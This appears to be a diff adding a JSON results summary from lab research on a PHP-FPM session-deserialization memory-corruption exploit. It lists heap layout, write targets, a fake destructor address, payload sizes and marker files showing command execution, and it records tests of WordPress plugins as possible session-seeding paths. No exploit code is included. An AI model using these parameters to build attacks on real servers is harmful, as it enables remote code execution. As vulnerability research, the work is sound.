@@ -1,0 +1,258 @@
+{
+ "schema_version": 1,
+ "generated_at": "2026-10-22T02:53:38+02:00",
+ "lab": {
+  "access": "private lab only",
+  "endpoint": "http://127.0.0.1:28891",
+  "shared_ports_untouched": [
+   "4052217",
+   "4052937",
+   "4053032",
+   "4054145"
+  ],
+  "wordpress_root": "/tmp/opencode/research/wprealhex_20261022T011837Z/www/wordpress",
+  "sessions_dir": "/tmp/opencode/research/wprealhex_20261022T011837Z/sessions",
+  "fpm_config": "/tmp/opencode/research/wprealhex_20261022T011837Z/conf/fpm.conf"
+ },
+ "binary": {
+  "path": "/tmp/opencode/realapps/install_realapps_np/sbin/php-fpm",
+  "php_version": "8.5.10",
+  "md5": "4ee099823b75e16ea36f93c71d57bfd8"
+ },
+ "config": {
+  "memory_limit_before": "128M",
+  "memory_limit_after": "256M",
+  "post_max_size": "8M",
+  "upload_max_filesize": "8M",
+  "session_serialize_handler": "php",
+  "session_upload_progress_cleanup": "0",
+  "aslr": "off",
+  "fpm_master_pid": 170169,
+  "worker_pid": 578505,
+  "worker_lineage": [
+   "181845",
+   "438081",
+   "510348",
+   "571938",
+   "574233",
+   "575723",
+   "577041",
+   "577724",
+   "578505"
+  ]
+ },
+ "plant": {
+  "file_size": 131000000,
+  "layout": "A*130999969 + '|i:1;' + B*26",
+  "observed_P": [
+   "0x7ffff3d88000",
+   "0x7ffff3d75000"
+  ],
+  "stale_128M_P": "0x7ffff35d6000",
+  "key_allocation_C": "0x7ffff3c01000",
+  "key_length": 1700000,
+  "coverage_offsets": [
+   1601512,
+   1523688
+  ],
+  "coverage_ok": true,
+  "bg_level_after_plant": 1,
+  "evidence": [
+   "phase/final_plant.txt",
+   "phase/final_plant_state.txt",
+   "phase/plant256_state.txt",
+   "phase/plant256_state2.txt",
+   "phase/plant256_state3.txt"
+  ]
+ },
+ "exploit": {
+  "write_address": "0x22c54c8",
+  "write_target": "0xa3c074",
+  "entry1_is_8_mod_16": true,
+  "fake_dtor_base": "0x7ffff3d88088",
+  "K": -8796077998781,
+  "K_check": "B0+0x10+16*K == 0x22c54c8",
+  "session_file_size": 60000000,
+  "key_length": 1700000,
+  "payload_len": 58299965,
+  "payload_mib": 55.6,
+  "threshold_48_1_mib_bytes": 50436506,
+  "threshold_exceeded_by_bytes": 7853459,
+  "Q": 1700033,
+  "F_off": 1700289,
+  "cmd_off": 1700313,
+  "cmd_len": 192,
+  "hit1": {
+   "data": "0x7ffff0200000",
+   "len": 60000000,
+   "level": 1,
+   "ser1": "0x9e6fae",
+   "P": "0x7ffff3d88000"
+  },
+  "hit2": {
+   "data": "0x7fffec800000",
+   "len": 60000315,
+   "level": 1,
+   "ser1": "0xa3c074",
+   "numargs": 1,
+   "arg1": "0x7fffec99f1d9",
+   "arg_type": 6,
+   "php_exec_ret_eax": 0,
+   "ser1_after_restore": "0x9e6fae"
+  },
+  "hit3": {
+   "len": 346,
+   "level": 0,
+   "ser1": "0x9e6fae"
+  },
+  "marker": "PASSTHRU_256_60M",
+  "marker_size": 0,
+  "marker_mtime": "2026-10-22T02:35:08.949890150+02:00",
+  "http_status": 200,
+  "worker_survived": true,
+  "post_state": {
+   "bg_level": 0,
+   "bg_data": null,
+   "ser1decode": "0x9e6fae",
+   "ser1encode": "0x9e7112",
+   "heap_real": 8388608
+  },
+  "serializer_side_effect": {
+   "entry2_name": null,
+   "entry2_encode": "0x7fffeca00000",
+   "entry2_decode": 0,
+   "entry1_valid": true
+  },
+  "secondary_1_9mb": {
+   "marker": "PASSTHRU_256",
+   "worker_pid": 575723,
+   "worker_survived": true,
+   "php_exec_ret_eax": 0,
+   "ser1_after_restore": "0x9e6fae"
+  },
+  "evidence": [
+   "phase/exploit_summary.txt",
+   "phase/final_big_gdb.txt",
+   "phase/mkkey_big.json",
+   "phase/final_big_state.txt",
+   "phase/final_big_sertable.txt",
+   "phase/final_big_req.json",
+   "phase/hits_c5.txt",
+   "phase/final_gdb.txt"
+  ]
+ },
+ "plugin_lane": {
+  "installed": {
+   "ultimate-member": "2.14.0",
+   "forminator": "1.58.2",
+   "hex-coupon-for-woocommerce": "1.2.4",
+   "contact-form-7": "6.2.3",
+   "contact-form-7-multi-step-module": "4.7.1"
+  },
+  "ultimate_member": {
+   "endpoint": "/um-register/",
+   "form_id": 30,
+   "page_id": 35,
+   "post_bytes": 3000268,
+   "field_bytes": 3000022,
+   "http_status": 302,
+   "user_id": 2,
+   "user_login": "umtestvpqggf",
+   "session_bytes": 0,
+   "user_meta_first_name_bytes": 3000022,
+   "option_name": "um_cache_userdata_2",
+   "option_bytes": 6002411,
+   "large_value_in_session": false,
+   "evidence": [
+    "phase/um_registration.txt"
+   ]
+  },
+  "hex_coupon": {
+   "session_ref_12345_bytes": 20,
+   "session_ref_12345_data": "referrer_id|i:12345;",
+   "session_ref_2000_digits_bytes": 16,
+   "session_ref_2000_digits_data": "referrer_id|i:0;",
+   "large_value_in_session": false,
+   "evidence": [
+    "phase/hexcoupon.txt"
+   ]
+  },
+  "forminator": {
+   "forms_count": 0,
+   "native_session_outside_vendor": false,
+   "native_session_vendor_files": [
+    "addons/pro/googlesheet/lib/external/vendor-prefixed/guzzlehttp/guzzle/src/Cookie/SessionCookieJar.php",
+    "addons/pro/googlesheet/lib/external/vendor-prefixed/phpseclib/phpseclib/phpseclib/Crypt/Random.php"
+   ],
+   "evidence": [
+    "phase/forminator_negative.txt"
+   ]
+  },
+  "cf7msm": {
+   "test_form_id": 36,
+   "test_page_id": 37,
+   "form_tag": "[textarea* bigfield maxlength:99999999]",
+   "default_mode": {
+    "field_bytes_100": {
+     "http_status": 302,
+     "cookie_bytes": 489,
+     "session_bytes": 0
+    },
+    "field_bytes_100000": {
+     "http_status": 502,
+     "error": "upstream sent too big header",
+     "session_bytes": 0
+    }
+   },
+   "forced_native_session": {
+    "filter": "cf7msm_force_session",
+    "field_bytes_3000000": {
+     "http_status": 302,
+     "session_bytes": 3000392,
+     "marker": true
+    },
+    "field_bytes_7500000": {
+     "http_status": 302,
+     "session_bytes": 7500393,
+     "marker": true
+    },
+    "field_bytes_8500000": {
+     "http_status": 413,
+     "error": "client_max_body_size 8m",
+     "session_bytes": 0
+    }
+   },
+   "max_observed_session_bytes": 7500393,
+   "max_body_bytes": 8388608,
+   "large_value_in_session_without_site_filter": false,
+   "filter_removed_after_test": true,
+   "evidence": [
+    "phase/cf7msm_boundary.txt",
+    "phase/cf7msm_default_evcookie.txt",
+    "phase/cf7msm_default_big.txt",
+    "phase/cf7msm_evforce3.txt",
+    "phase/cf7msm_evforce75.txt",
+    "phase/cf7msm_evforce85.txt"
+   ]
+  },
+  "result": "no tested free public plugin produces a 48.1MiB unauthenticated native-session seed out of the box",
+  "evidence": [
+   "phase/plugin_lane.txt",
+   "phase/plugin_state.txt",
+   "phase/plugin_activate.txt",
+   "phase/plugin_inspect.txt",
+   "phase/plugin_pages.txt"
+  ]
+ },
+ "missing_app_precondition": "A site must enable native session storage in the plugin (for CF7MSM via cf7msm_force_session or cf7msm_allow_session), raise client_max_body_size and post_max_size above 48.1MiB, and expose a form field with maxlength above 48.1MiB. The live app has client_max_body_size 8m and post_max_size 8M, so the plugin path is capped below 8MiB. The proven path uses a direct-written php session file.",
+ "receipt": {
+  "readme": "README.md",
+  "summary": "summary.json",
+  "markers": [
+   "PASSTHRU_256_60M",
+   "PASSTHRU_256"
+  ],
+  "phase_dir": "phase",
+  "scripts_dir": "scripts"
+ }
+}
